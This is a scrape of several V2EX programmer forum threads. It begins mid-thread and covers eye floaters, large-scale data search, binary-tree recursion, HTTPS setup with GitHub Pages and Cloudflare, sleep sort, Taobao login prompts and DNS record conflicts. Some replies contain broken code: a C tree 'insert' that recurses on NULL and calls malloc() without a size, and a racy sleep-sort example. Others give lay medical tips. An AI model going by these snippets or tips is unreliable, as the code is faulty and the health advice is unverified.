"\r", "之前见过一个说法，现在电子屏幕比一般纸质书籍更伤眼睛的原因主要是两个，一是分辨率不足时，由于边缘模糊，使眼睛认为没有准确对焦而处于紧张状态；二是人在看电子屏幕时不眨眼睛。\r", "\r", "PS ：晶状体浑浊好像要避免老揉眼睛的习惯。", "另外不看明亮表面就注意到不到飞蚊的话其实无所谓的，大多数近视的人玻璃体里面都不是完全干净的，只不过一般不去在意就视而不见了。看电脑会明显大概是屏幕太亮了（这个类似投影到你的视网膜上，对面越亮影子越深，眯眼睛会变明显也是类似的道理，光源变集中了也会加深影子）。", "另外，中国人都认可一种看不见但伤害非常大的东西：辐射\r", "\r", "诶，原来我是个假的中国人，\r", "\r", "说正经的\r", "\r", "1. 楼主最好去下医院，飞蚊症太严重的话，最好别当程序员。\r", "2. 各种设备都是指标不治本，最好的办法还是保持正确的姿势，看段时间电脑休息几分钟眼睛。", " #33 飞蚊症是玻璃体混浊，晶状体混浊就不是飞蚊症了，那是白内障……Σ(゜ロ゜;)", "羡慕可以在家写代码的人……在公司基本上只能用劣质显示器", " bing 团队就有盲人程序员", "投影仪,比较费灯泡.\r", "后期使用一直有投入,我司现在都将投影仪换成大电视了(也许是一种很贵的监视器?).也是从节约成本的考虑.", "其实对屏幕细腻程度对眼睛没有多少伤害。使用时间也没有一个固定的标准。\r", "最主要是，不要在疲劳时强制自己工作，对眼睛影响最大的情况是眼疲劳没有及时缓解，导致眼部功能受到消极影响。\r", "\r", "不过一个细腻的屏幕确实可以改善眼睛续航时间，然后你可以给老板干更多的活啦！", "无语法高亮...黑白墨水屏，难受", " 有灰度 加粗 下划线 斜体 等。早期的电子词典有这个功能", "先说说你现在用的屏幕型号", " 公司不会拦着你自带吧..", " 因为别人都没带，自己带会感觉很矫情，浑身不自在，需要强大的气场支持。", " 有什么好羡慕的，在意这个可以买个显示器放公司用", "投影仪光更强吧。。", "多护眼吧，买点人工泪液型的滴眼液，保持眼睛滋润。\r", "采用 20-20-20 方式用眼。每 20 分钟看向 20 英寸以外的地方 20 秒。\r", "我去年也是挺严重的，这段时间坚持了一下，感觉黑影明显少了些。", "好几年了...后来觉得这病没得治...也没啥太大影响....实在不行就只能买滴眼液了...", "有毛病不去医院寻求专业的指导，自己在这 XJB 琢磨，真是不懂你们这些人。", "那些说看医生的。。。才是瞎 JB 琢磨。。自己没得过，我去了中医院，花了 4 、 5 百各种检查（骗钱的），医生说，没法治。除非非常严重影响到看东西才去做手术。。然后给我举了个例子，说好像灰尘掉到水里了，你不能碰到水，能拿的出来吗：），我 QNMLGB 。。。后来看淡了。就酱。", "感觉有时候投影仪投到白墙上会比显示器更加刺眼", " \r", "50% off 立马买一个", "好多人以为是老花眼不重视,最后失明啦\r", "...........\r", "萨普爱思滴眼睛！", "flux", " 因为别人都没带，自己带会感觉很矫情，浑身不自在，需要强大的气场支持。", " 不能自带么？", " 抱歉，口误口误，是玻璃体，谢谢提醒。", "配合番茄工作法..多休息.好好爱护眼睛吧..", "记得保护眼睛 定时休息 多运动（不要剧烈） 补充营养\r", "每年定期去眼科做一套检查 尤其是眼底 眼底非常重要\r", "年轻的时候没保护好 等 50 岁后 会非常痛苦 眼底不好的人 做什么手术都没用 很难治的 会有很多并发症", "啥是飞蚊症...", "我也有飞蚊症，而且也挺严重\r", "不过这东西不好治", "要买足够好的显示器，比如艺卓...", "同病相怜，注意用眼药水和眼贴。", "降亮度降对比降黑电平，没决定其他办法前先试试这个吧，能让眼睛周边肌肉舒服些。\r", "其实一般眼睛很难“用坏”的，即使是电子屏幕也不容易伤眼睛，大多数情况下只是日照少了导致问题，多晒晒不太强烈的太阳多运动吧。", "去查查眼底吧，傻孩子", " 没有舍得上好的", "飞蚊症正式名称为玻璃体混沌或玻璃体浮游物[1]，又称云雾移睛[2]。是一种因投入眼睛的光线将浮游在玻璃体的混浊物投影在视网膜上，而在视野中看到物体漂浮的现象。这些玻璃体浮游物在玻璃体中具有不同大小、形状、浓稠度、折射率和能动性，并且通常都是以透明的型态呈现[3][4]。当人还在年轻的时候，玻璃体是透明的，但是当人开始老化时，玻璃体就会逐渐混浊，而一般存在于人体眼中的浮游物就是因为玻璃体的退化变性所造成的。当光线将这些玻璃体浮游物投影在视网膜上就会被人眼所看见[5]。人眼中通常可以看见的浮游物会在视野中单独出现或者是与其他的浮游物一同出现，这些物体可以是点状、条状、网状，一个或数个一起出现，并在患者的眼睛中漂浮[4]，所以飞蚊症不属于视觉假象而是属于内视现象。而这些物体因为是漂浮在玻璃体当中，随着眼球的转动而移动，如同蚊子在眼前飞舞，故称为“飞蚊症”。", "我用了防蓝光的眼镜感觉好很多，还有用 mac 我感觉应该可以保护视力，字体渲染好太多了 = =", "没有科学证据表明 自发光的物体会比自然反光的物体更伤害眼睛", " 和显示器比比对比度和色域吧", "我也有 怎么办", "可怕", "kindle dx （也有可能是 kindle 3 ）可以 vnc 连接到 pc 上当显示器用", " 应该是静电吸附得灰尘，被当做辐射", "一定要买好一点的显示器，屏幕亮度调暗一些，按时离开电脑休息。感觉用投影仪反而会更累...", "去医院看看吧", " 外接多个屏，大一点 远一点。\r", "主屏  副屏 ，交叉着看。远近交叉。\r", "\r", "我觉得很高明。请你睾性一点"]},
{"content": ["<div class=\"topic_content\">400 亿规模的数据规模如何进行快速搜索和入库呢？用 mongodb 集群+es 可以完成这项任务吗？</div>"], "reply": "13", "tittle": "上百亿数据规模数据数据如何进行处理", "comment": ["同样问题 你们入库速度大概多少 我 26000000 大概半小时 单机 es", "磁盘、内存、 CPU 是啥配置，不说没法对比啊", " 内存 16g i7 三代 硬盘 500g ubuntu 16 04", " 500g HDD?", "通用思路应该是根据搜索需求的具体情况来分库，热数据直接放内存，冷数据放硬盘", "500g HDD ？？？\r", "你每条数据有多小？\r", "10b 一条？", "我觉得做这种事情的人问这种问题有种悖论在里面。\r", "就好像之前看过一个询问“我就要当 CEO 了，请问 CEO 平时都做些什么？”", "['100 亿数据 1 万属性数据架构设计']( ", ")", " 每天数据应该在 100kb 以内吧", " 对 hdd 大概 100000 数据 /s 每个包大概 14Mb", "这个问题至少值几十万年薪啊", " 月入 5.5 块的路过...", "关注这个问题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>二叉树中很多题目用到递归，比如反转二叉树</p>\n<pre><code>public TreeNode invertNode(TreeNode root) {  \n                if(root==null)  \n                    return root;  \n        TreeNode temp=root.left;  \n        root.left=invertNode(root.right);  \n        root.right=invertNode(temp);  \n        return root;  \n    }  \n</code></pre>\n<p>要怎样去在脑袋里过一遍这段代码的运行过程？</p>\n<p>整个过程的栈帧变化是怎样的？</p>\n</div></div>"], "reply": "5", "tittle": "二叉树中的递归有点难以理解，求解答？", "comment": ["建议你先看一下我写的《树形结构的调试打印》： ", "\r", "\r", "不过里面是非递归用法。你可以随便写一棵二叉树，用递归插入和删除\r", "\r", "```c\r", "void insert(struct node **n) {\r", "    if (*n == NULL) {\r", "        *n = malloc();\r", "        printf(n-->value);\r", "    }\r", "    insert(n->left);\r", "    insert(n->right);\r", "}\r", "\r", "void delete(struct node *n) {\r", "    if (n != NULL) {\r", "        delete(n->left);\r", "        delete(n->right);\r", "        printf(n->value);\r", "        free(n);\r", "    }\r", "}\r", "\r", "// demo\r", "insert(tree->root);\r", "dump(tree);\r", "delete(tree->root);\r", "```\r", "\r", " 无需我讲解了，该打印的打印，你就知道为何采用这种顺序。\r", "\r", "顺便说一下，删除可以优化\r", "```c\r", "void delete(struct node *n) {\r", "    if (n->left != NULL) {\r", "        delete(n->left);\r", "    }\r", "    if (n->right != NULL) {\r", "        delete(n->right);\r", "    }\r", "    printf(n->value);\r", "    free(n);\r", "}\r", "```", "栈有什么特别的？不就是调用压返回出么\r", "递归不要关注这种细节\r", "你只需要证明两点：\r", "递归不变式\r", "结束条件", "楼主的栈帧是指 函数调用栈 吗，和 #2 说法一样，算法本身不关心调用栈，递归应该关心的是递归式子和递归何时结束。\r", "怎么在脑子过这问题的话，递归都一样吧，每次调用记住这个一次调用的状态（该题的话就是二叉树的根和她的左右儿子）。\r", "建议楼主画个图跑一边就清楚了", "如果你是想把递归解改成非递归的话\r", "其实这里用到的参数只有一个： root\r", "循环过程中维护好这个栈就好\r", "同时，如果你的树里有子到父的回指针的话，不需要栈，因为反正能算出来\r", "这就是 DFS", "递归就是要用递归的方式, 不需要栈什么的\r", "\r", "我感觉你贴的代码看起来很别扭...\r", "\r", "\r", "\r", "你写这个递归函数的时候, 你就想象这个函数是完成的. 所以你先去反转左子树(函数调用); 再去反转右子树, 因为我们假设这个函数是已经完成了的. 那么左右子树都是交换了的, 那么只用交换左右子树的位置.\r", "\r", "这里, 也可以先交换左右子树的位置, 再去反转左右子树. 顺序没关系."]},
{"content": ["<div class=\"topic_content\">目前在学习 web 前端开发，身边同学有人参加软考，但没怎么听说过 web 前端也有类似的资格考试认证，真的没有还是自己孤陋寡闻，希望大家能帮忙解答？</div>"], "reply": "目前尚无回", "tittle": "web 前端开发有类似于软件工程师证书之类的国家认证考试吗？？", "comment": []},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>1 、 godaddy 注册的域名，域名没有添加证书（之前尝试添加，但是失败）</p>\n<p>2 、该域名 <a href=\"https://www.aaa.com\" rel=\"nofollow\">https://www.aaa.com</a> 和 <a href=\"http://www.aaa.com\" rel=\"nofollow\">http://www.aaa.com</a> 在 pc 端都可以访问，但是移动端 http 能正常访问，加了 s 之后 https 就无法访问， qq 浏览器，谷歌浏览器，默认的 Safari 全都无法打开，一直正在打开.......</p>\n<p>3 、其他域名在移动端的各种浏览器 http 和 https 都能打开</p>\n<p>请问这可能是什么原因？</p>\n</div></div>"], "reply": "5", "tittle": "诡异的 https，移动端 https 无法访问， http 正常访问", "comment": ["估计没有添加中级证书，印象中 Godaddy 是四层证书链", " 这边去测一下看看有哪些问题", "  那这种怎么破？", "  这里测试都是 A ，只有 Handshake Simulation 下少数几个错误，\r", "\r", "IE 6 / XP   No FS 1\t  No SNI 2\tServer sent fatal alert: handshake_failure\r", "IE 8 / XP   No FS 1\t  No SNI 2\tServer sent fatal alert: internal_error\r", "Java 6u45   No SNI 2\tServer sent fatal alert: internal_error\r", "\r", "这能说明什么？", "了解到可能是 PC 端浏览器对 https 都有解释和兼容，会跳转到 http ，移动端不存在这个功能，但是其他一样的域名却可以在移动端通过 https 访问"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>打算用 Namecheap 的 SSL 证书，第一步就需要我生成 CSR 证书，但是我的服务器是 Github Pages 的.</p>\n<p>请问怎么生成 CSR 证书。搜了一圈，貌似没有类似的教程。</p>\n</div></div>"], "reply": "34", "tittle": "Github Pages 如何生成 CSR 证书", "comment": ["可以用 coding ，自动送证书，不用配置。。", " 我的是 Github 学生包送的，不想浪费了。。。谢谢回复", "Github Pages 不支持自定义，别浪费证书了。", "套一层 Cloudflare", " 是这样子，我之前就这么觉得，但是好像网上有人用 Cloudflare ，我就以为 Cloudflare 和 Namecheap 是同一个东西。", " 套一层的意思是什么。。不是 Cloudflare 和 Namecheap 2 选一吗", "知其然知其所以然\r", "才能进步", " \r", "\r", "Namecheap  域名提供商\r", "Cloudflare CDN 提供商 =>支持\r", "Github Pages 页面托管位置 =>不支持自定义\r", "\r", "所以，你明白 @", " 的意思了吧？\r", "\r", "  我这么回复对么，", " \r", " \r", " 我懂了 。谢谢了。", "这个证书哪家签发的都不行，重要是要在服务器上配置，所以也要有相应的接口。", "GitLab Pages 是可以配置自己证书， GitHub Pages 不支持， Coding 会自动签 LE 的证书", " hello ，我操作后提示“此网页无法提供安全链接”，可以给一个可能的思路吗", " 你提供这么少信息没法 debug 诶，具体说说你操作了什么？", "github pages 不支持自定义证书。所以只有两个思路，一个是使用 cloudfare ，它会帮你套一层 https 的壳，第二种方法，就是不用 github pages ，用别家的，或者自己买个云主机。(student package 有送 digitalocean 的 100 刀，建议折腾这个)", "用 firebase hosting", " 一觉醒来就自动好了，估计生效很慢吧， 23333 ，谢谢了", "CSR 不是证书，只是一个请求字符串，有很多在线 CSR 工具可用", " 现在只有 50$ 了…", " 签发证书需要时间", " get,最后虽然是不是完全加密的 HTTPS ，但是我已经很麻烦了， thanks a lot.\r", "\r", " 不是要在主机上生成的吗？\r", "\r", " 邀请链接不是+10 吗", " 额额，缩水了啊，我那时候是 100 刀，弄了个 5 美金的服务器，拿来搭梯子翻 qiang ，用了一年半\r", "\r", "  额  不过 github pages 再怎么弄也没法用自定义证书啊，你生成了证书放哪里用呢？\r", "所以还是建议使用 students package,你可以学到如何搭建 ss 环境翻墙，配置 Nginx 服务器，配置 https 证书等等。我现在就是用的腾讯云学生主机，优惠后 1 元一个月，然后把 github pages 挪到了 vps 上（不过现在我的 https 不完美，正在 debug  ", "  ）", " 我的也不完美，腾讯云阿里云国际我基本都有，不过还是比较喜欢 github pages..", " 估计是太多人滥用了吧... 但 AWS 的是 100$ 呢，但需要信用卡验证，否则只有一半，再加上免费一年试用，一个 EC2 Micro 实例用个两年是没什么问题的，性能还比 DO 的好", " aws 账单后付有点不太敢用， 23333", " 我说的是 [GitHub 的学生礼包](education.github.com)，服务器的话包括 Do 的 50$ 和 AWS 的 100$，还有 1 年免费 .me 域名和证书", " 哦哦，是吗，昨天好像没瞄到，有空再去看看", " 没明白你的意思， CSR 其实填的是一部分个人或组织信息而已，用工具生成后直接请求证书就行", " 这样子，我以为只有在服务器上输入命令才能生成的。虽然原理可能差不多，但好像是我误区了。", " 没事的 即使你用超了免费配额也还有 100$ 的余额挡着……… 在你把 100$ 用完之前是不会扣费的\r", "\r", "（不过被 DDoS 就不好说了 2333 虽然有可能免单）", " AWS 如果不小心开了块高性能 SSD 硬盘就能随便吃掉你一个月上千刀（吃过这张账单的看着你们", " 可怕……", "不如直接用 Cloudflare 套一层, 简单快捷. 小站用的也是 GitPages,  用 CloudFlare 做 DSN, CDN, 默认配置即可 https(共享证书)  ", " 现在，我现在就是这么做的。可以看我的另外一个帖子 ：/t/344686\r", "只是双线部署有点难到我了", " 第一个\"现在\"——>\"谢谢\""]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h3>接上文 /t/344377 知道了 Cloudflare 是通过 CDN 的方式来实现 HTTPS 的，但这种方式它的原理是当访客使用 HTTPS 访问站点的时候，从访客到 CloudFlare 这段是加密的，然后从 CloudFlare 到站点这段是明文的，所以说这种方式是非完全安全的， Chrome 下允许加载不安全的脚本（即 CloudFlare 的证书）后就会完全变成红的感叹号。</h3>\n<h3>这就很尴尬了，幸好看到了双线部署，那么问题来了。</h3>\n<h3>我想实现的是 Coding Pages 使用它自带的 Let ’ s Encrypt 证书， Github Pages 使用 Cloudflare 半身不遂的证书，但是我在配置 Cloudflare 的时候已经把域名的 DNS 服务器设置成 Cloudflare 在美国的了。貌似因此无法在 Coding Pages 申请证书</h3>\n<p><a href=\"http://i.imgur.com/QextJwAg.png\" rel=\"nofollow\">http://i.imgur.com/QextJwAg.png</a></p>\n<h3>插入一个小问题， CNAME 域名解析是解析到 <a href=\"http://Pages.coding.me\" rel=\"nofollow\">Pages.coding.me</a> 还是${username}.coding.me ，因为生效一次要很久，所以验证有难度。</h3>\n<h3>大神们可以提供一下思路吗。</h3>\n<h3>BTY</h3>\n<h3>每次发帖都发到 Chamber 是一种被降权的体现吗？还有可能因为每天都刷 V2 导致访问频率不太正常，不能及时回复还望理解。 1800s...</h3>\n</div></div>"], "reply": "29", "tittle": "Hexo 博客 Coding+Github 双线部署求 https 方案", "comment": ["贴的图好像有点奇怪，内容如下：\r", "\r", "注意：申请 SSL/TLS 证书需要通过 Let's Encrypt 的 HTTP 方式验证域名所有权。如果您的域名在境外无法访问 Coding Pages 的服务器，将导致 SSL/TLS 证书申请失败。\r", "\r", "：）", " 的 CNAME 是绑定 pages.coding.me\r", "github pages 貌似无法解决 https 自定义域名的问题", "硬是没看懂，说下我自己的。默认解析 coding ，海外解析 github 。因为 github 被我设置强制 HTTPS ，然后海外访问会爆红，但无所谓啦", " 所以我用 cloudflare,但是他要我更换 dns 服务器，更换后貌似导致域名访问不了 coding pages 的服务器了", " 对对，就是要你这种，海外爆红，但是国内绿绿", " 你有写过相关的教程，或者资料，都可以扔给我:)", "感觉还是用别家的博客服务比较好， segmentfault 就不错", "能不能思路线整理清楚再发，看着太累了。\r", "\r", "仔细看了下，你的目的只不过是想要 GitHub Pages 使用自定义域名 + HTTPS 而已？\r", "\r", "要实现自然是套 Cloudflare ，但是你要在 CloudFlare 的 Crypto 里，把 SSL 配成 Flexible ，否则是不允许 CDN 通过 HTTP 连接服务器的。配上以后浏览器才不会提示不安全，我就是这么用的。\r", "\r", "双线才不好搞 HTTPS 呢……", "首先，既然你要 Coding + GitHub 双 Pages 部署，那么我理解你是对国内国外两边访问速度都有追求。 CloudFlare NS 方案排除，因为 CloudFlare 的 NS 不能分区解析，所以无法直连 Coding 服务器。\r", "\r", "其次，你两边都要有 https 。考虑到 GitHub Pages 不提供对自定义域名的 https 服务，你需要一个反向代理给你加上 HTTPS ， CloudFlare 是最好选择。\r", "\r", "再者，看起来你没有买服务器的打算。如果考虑购买服务器，那你可以自己设置一个对 GitHub Pages 的反向代理来提供国外服务。\r", "\r", "那么怎么办呢，答案就是购买 CloudFlare 的 Business 或 Enterprise 方案。这两个付费方案，支持 CNAME 接入。你可以通过支持分区解析的 DNS 将国内外分别解析到 Coding 和 Github 双 Pages （需要对 Let's encrypt 的地区解析到 coding ），同时实现 https 。那这要多少钱呢，不好意思， $ 200 / month ，还不如自己买服务器。\r", "\r", "综上所述，想免费的实现这套东西是不可行的，要么选择放弃 https ，要么选择放弃海外 /国内访问之一。", "发完才发现 7 楼说得对", " 抱歉，我的文字确实很乱，你的我已经试过了，没用。还有我是双线部署就是为了解决这个问题", " 不不不，你说的才是我想要，如果反代的话，国外服务器应该可以吧？", " 方便提供一下你的域名地址吗，是绿色的小图标吗？难道是我操作有误？", " ", "之前折腾过的一个方案，域名用 dnspod 的智能解析，加上国内 gitcafe 再 host 一份 blog ，可以根据不同线路访问分流了\r", "\r", "\r", "\r", "供参考， gitcafe 被 coding 收购了，不过感觉应该大同小异", " 难道是我没配 www 吗。我再试试，谢谢了。\r", "\r", "\r", " 非常感谢：）", " 你给国外反代用国外服务器就行。\r", "\r", "至于页面资源不是 https ，你可以检查一下你的 Jekyll 模板之类的，确认他生成的代码是 https 开头的。", "Alphassl 泛域名证书 部署到两边", " 好的，我先尝试下 7 楼的方案", " 一开始就是设置成这样子的。但是还是不行\r", "\r", "\r", "\r", "  \r", "移除你的 CNZZ 统计脚本，红色不安全会变成灰色 https\r", "移除你的占位图，灰色小图标会变成绿色小锁", " 身为一个开发人员我竟然没有下意识 F12 。奇怪，我明明没有 cnzz 账号啊。", "\"Chrome 下允许加载不安全的脚本（即 CloudFlare 的证书）后就会完全变成红的感叹号。\"\r", "啥意思？怎么弄，我用的就是 CloudFlare Flexible SSL, 一点问题都没有。", "L19 正解。 HTTPS 是否报错与 Cloudflare 没有关系，也和 LE 或者是 Cloudflare 的证书没有关系，只是配置错误。\r", "\r", "几乎不可能实现国外走 Cloudflare ，国内走 Coding ，因为 Cloudflare 只提供了 NS 接入。 Cloudflare 没有给免费的个人启用 CNAME 的接入，倒是可以申请免费的 Cloudflare Partner 可以得到免费的 CNAME 接入，有 HTTPS （需要通过 API 的方式管理域名），我有一个 Partner 账号， API 操作太麻烦就放弃了。\r", "\r", "想要全球都速度快，便宜的方案就是 GeoDNS ，国外走 CloudFront 的 CDN ，国内自己的服务器： ", " 是我乌龙了，在这里要非常感谢 @", " ，同时深深鄙视我自己。", "你的意思是，想上 https 還要國內外分流？\r", "\r", "\r", "\r", "可以試試 Netlify ，重定向，自定義 HTTP 頭，都可以。不過，國內速度還是不怎麼理想。不過，能上 hsts 倒是出乎意料。\r", "\r", "一定要用 coding pages 的話，國外反代的時候不用 let's 證書即可，或者換成 dns 驗證。\r", "dns 解析換成 cloudxns ， dnspod 好像也行？", " 万分感谢：） cnzz 好像是我用的主题自带的我没有注释掉，占位符是我贪方便，没想到有这样的影响，看来还是我对 HTTPS 理解不够啊。\r", "\r", "那么 HTTPS 下有什么可能的统计访问量的方法呢？还打算在这里面 ", " 选一个呢\r", "\r", "\r", " 好的，我先去您的文章，感谢提供思路：）", " 这个是不是有点高级，我先去看看，感谢提供思路", "直接用 netlify 咋样", " 好的，有空我去看看", " 好的，有空我去看看"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>支持三种算法来计算。在某相关公司跑了有些年头了，看起来没什么毛病。</p>\n<p>然后所以我今天把它开源出来了，只不过把所有敏感信息给删掉了。求赏脸。</p>\n<p><img alt=\"Byakuren\" src=\"https://raw.githubusercontent.com/XadillaX/byakuren/master/byakuren.png\"></p>\n<p><a href=\"https://github.com/XadillaX/byakuren\" rel=\"nofollow\">https://github.com/XadillaX/byakuren</a></p>\n<p>然后关于某些算法，在我的博客里面之前有讲： <a href=\"https://xcoder.in/2014/09/17/theme-color-extract/\" rel=\"nofollow\">https://xcoder.in/2014/09/17/theme-color-extract/</a></p>\n</div></div>", "<div class=\"topic_content\">啊，经过同意的，大家别误会了😂</div>"], "reply": "6", "tittle": "一个 C 写的主题色提取库： Byakuren", "comment": ["这个……为企业需求所写的代码属于企业所有吧", " 经过同意了。", "想用 k-d 树可以试试我的:-) ", "厉害", "题主是花瓣的啊 挺喜欢花瓣的 随便问个事 画板 1900 张后加载不出来的 bug 有没解决了 /笑 cry", " 我两年前就离职了( •̅_•̅ )"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Google 了很久，也没找到相关的教程。知乎上也只有一些对于代码质量的评价，并没有说如何在相关的编辑器中使用 Pysonar 。</p>\n<p>请问如何可以在相关的编辑器中使用 Pysonar ，感受一下它对于 Python 代码的静态分析，是否已经有造好的轮子？</p>\n</div></div>"], "reply": "2", "tittle": "如何在 Vim/Emacs 或者 IDE 中使用垠神的 Pysonar？", "comment": [" 新手只想问一下有没有关于 Pysonar 的使用教程？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>估计有大部分人不知道把，原理是构造 n 个线程，它们和这 n 个数一一对应。初始化后，线程们开始睡眠，等到对应的数那么多个时间单位后各自醒来，然后输出它对应的数。这样最小的数对应的线程最早醒来，这个数最早被输出。等所有线程都醒来，排序就结束了。\n放个例子：</p>\n<pre><code>public class SleepSort {\n    public static void main(String[] args){\n        int[] nums={9,7,2,6,15,8,9,9,9,9,9};\n        SleepSort.sort(nums);\n        for(int n:nums)\n            System.out.printf(\"%d    \",n);\n    }\n\n    public static void sort(int[] nums){\n        Sleeper.idx=0;\n        Sleeper.output=new int[nums.length];\n        for(int i=0;i&lt;nums.length;i++)        //[1]\n            new Sleeper(nums[i]).start();\n\n        try {\n            Thread.sleep(100);                  //[2]\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n        for(int i=0;i&lt;nums.length;i++)\n            nums[i]=Sleeper.output[i];\n    }\n}\n\nclass Sleeper extends Thread{\n    public static int[] output;\n    public static int idx;\n\n    private int sleep_time;\n\n    public Sleeper(){\n        this.sleep_time=0;\n    }\n    public Sleeper(int sleep_time){\n        this.sleep_time=sleep_time;\n    }\n    @Override\n    public void run(){\n        try{\n            Thread.sleep(this.sleep_time);\n        }catch(InterruptedException e){\n            e.printStackTrace();\n        }\n        output[idx++]=this.sleep_time;\n    }\n}\n</code></pre>\n</div></div>"], "reply": "106", "tittle": "今天看到一个新的排序法 睡排序 真的是脑洞大开。。。", "comment": ["逻辑上果然够简单， O(∩_∩)O 哈哈~", "我想到之前一个笑话...要求输出一天后的时间...\r", "\r", "sleep(86400); \r", "echo time();", " 这让我想到之前一个笑话...\r", "把程序运行时间乘以 0.8 后再输出，程序效率就提高了", "好有才！！", "系统对 alarm 的排序是 O(n)，遍历一遍是 O （ n ）， 所以还是 O （ n ）", "这个可以是一个段子，虽然思路新颖。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h2>本人基本情况：##</h2>\n<p>2016 年的本科毕业生，软件开发方向，现位于广州。毕业前一段时间直到现在都是跟一个工作室（艺术工作室，非 IT 类外包工作室）合作做他们的项目，项目涉及 app 、微信、普通网站等形式的开发。我后台开发 API 及服务器运维为主， web 前端也会开发，但是不专注前端开发。</p>\n<h2>项目情况：</h2>\n<p>全新开发的项目，非二次开发，也不会是外面的一般的外包的 2000 元做淘宝的那种项目，预算会比较高，项目来源比较稳定。（近两周将有 2 个 app 进入开发期）</p>\n<p>此前试过跟已工作的同学合作接手这些项目，但是他们本身要经常加班，所以做我这里的项目时无论效率跟质量上都有待提高。所以希望找到同样的自由职业或创业的程序员合作，尽量在项目质量和服务上做好，毕竟拿多少钱做多少事。另外有一个筹备了很久的程序员社区需要开发，还有一些爬虫以及数据处理的难题需要去探索解决，有意向可以交流。</p>\n<h2>要求：</h2>\n<p>广州地区，需要会面交流，另外希望是同龄人。 IOS/Android 开发、前端开发、后台开发、或者开发爬虫的都可以。（已注册有公司对外公司名义接项目，长期合作希望可以合租办公室）</p>\n<p>联系方式：微信号 A_8286946  （创业不易，目前都是靠自己辛苦码出来的，希望找到同道中人，现在起点还很低，希望能加速进步。）</p>\n</div></div>"], "reply": "2", "tittle": "寻抱团的程序员自由职业者，坐标广州", "comment": ["有相关意向的请联系一下，谢谢", "创业维艰，如果有全职工作羁绊，确实更难。"]},
{"content": ["<div class=\"topic_content\">忘截图了，刚才清了 Cookies 结果无法重现了，这是什么时候出现的新快捷登录吗？\r<br>\r<br>手机和电脑处于同一路由器下，注销手机淘宝重新登录也没再弄出这个提示</div>", "<div class=\"topic_content\"><a target=\"_blank\" href=\"https://www.v2ex.com/t/344726?p=1#r_4100517\" rel=\"nofollow\">https://www.v2ex.com/t/344726?p=1#r_4100517</a></div>", "<div class=\"topic_content\">append 错了\r<br>\r<br><a target=\"_blank\" href=\"http://i.imgur.com/boLq6U2.png\"><img src=\"http://i.imgur.com/boLq6U2.png\" class=\"embedded_image\"></a></div>"], "reply": "12", "tittle": "刚才 Safari 打开淘宝网，提示“检测到您的手机淘宝已登录”，这是在服务端完成还是客户端呢？", "comment": ["复现了。。。就是在手机淘宝登录的情况下，登录网页版淘宝，再访问 ", " 就会有这个提示，看来是在服务端做的验证，我以为是能智能检测同网段设备了", "应该看 ip 吧", "r#2 @", " #2 我给手机开了 Surge 全局，也一样是提示手机淘宝已登录，不知道还有没有别的检测方式", "肯定是服务端做的啊", "r#4 @", " 我以为是像 QQ 那样的访问 PC QQ 开的端口实现的快速登录", "应该说是在手机淘宝打开的情况下 pc 端登录会提示吧,", "试了一下，没有复现。\r", "1.在同一个 WiFi 下。\r", "2.iPhone 打开手机淘宝。\r", "3.Safari 打开淘宝网，点登陆。没任何提示。\r", "\r", "难道重点在于“登录网页版淘宝”（手机）？", "r#7 @", " 我这可以 100%复现啊……记得淘宝网 Cookies 是有过期时间的，过一段时间之后，即使淘宝网顶部状态是已登录，点击收藏宝贝等功能的时候也是需要重新登录的。我又手动访问了 ", " 相当于重新登录，就会跳出这个手机淘宝已登录的提示", " 求截图", "r#9 @", " \r", "\r", "\r", "把手机淘宝打开，就会出现这个提示；\r", "然后把淘宝切后台，刷新网页，还是出现这个提示；\r", "把淘宝从后台清掉，刷新，提示消失；\r", "先开飞行，再把淘宝从后台清掉，刷新，提示还是有，大概过 1-2 分钟后就没了", "Shared web credentials", "不是什么高级玩意儿\r", "手机淘宝就是一个淘宝版的浏览器，你请求的是淘宝的 mobile webpage ，所以设个 cookie 什么的没啥问题\r", "见\r", "\r", "It shares cookies and other website data with Safari."]},
{"content": ["<div class=\"topic_content\">用的 cloudxns ，没法搞，但 dnspod 可以， v2 朋友说前者好，后者 xx\r<br>\r<br>有用企业邮的么\r<br>\r<br>谢谢</div>"], "reply": "13", "tittle": "企业邮箱，需要验证 @的 mx 记录，可这样就不能用 @的 cname 了", "comment": ["请使用 cloudxns 自带的 LINK 记录。", "@ 不能是做 cname", " 谢谢，这样的话其他有冲突的 txt 与*也可以解决了？", " 怎么说？", "@的 cname 和 mx 是冲突的，不太建议 @用 cname ， web 服务器和邮件服务器一般是分开的", " 我这是个人的域名，@记录解析博客， mx 域名邮箱，用的云加速，只能 cname 呀", "@ - Link - ", "\r", "at - CNAME - yourcname", " 谢谢", "这是病，得治", "先明确一点， CNAME 的意思 并不表示 将 A 记录(IP) 用别名管理。而是这个子域(@或者 www 或者其他)的所有记录(A 、 AAAA 、 TXT 等)都用别名。\r", "\r", "所以 任何一个 子域设置 CNAME ，就不能再设置任何其他的解析。\r", "\r", "即 @ CANME ，就不可能有 @ MX 。\r", "\r", "同样 www 设置了 CNAME ，那 www 也不能有 MX 。\r", "\r", "而 dnspod 的 CNAME 加速，可以解决 CNAME 和 MX 冲突。本质上这个 dnspod 的 CNAME 加速，是用 dnspod 自行查找数据库，将 CNAME 的值 变成 IP 转换成 A 或 AAAA 记录放在 DNS 上。将 CNAME 与 MX 冲突问题转换成了 A 与 MX ，自然就没有冲突了。", " 多谢", " \r", " ", " 我的 cname 有个是到 cdn 的域名"]},
